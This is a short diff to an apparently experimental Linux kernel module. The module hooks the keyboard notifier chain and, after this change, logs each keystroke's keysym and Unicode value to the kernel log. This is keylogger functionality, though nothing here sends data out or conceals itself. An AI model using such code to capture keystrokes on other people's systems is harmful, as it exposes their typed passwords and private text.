@@ -11,7 +11,7 @@ static struct notifier_block nb = {
 };
 
 //buffer for translated key symbols
-static char trans[16];
+static char trans[BUFMAX];
 
 /*Called when a key is pressed.
  *No, I don't know what the parameters are/do.
@@ -27,7 +27,7 @@ int kstroke_handler(struct notifier_block *nb,
     case KBD_UNBOUND_KEYCODE:
       printk(KERN_ALERT "Unbound\n"); break;
     case KBD_UNICODE :
-      printk(KERN_ALERT "Unicode?\n"); break;
+      printk(KERN_ALERT "Unicode : %x\n", keystroke->value); break;
     case KBD_KEYSYM :
       printk(KERN_ALERT "Keysym  : %x\n", keystroke->value);
       break;
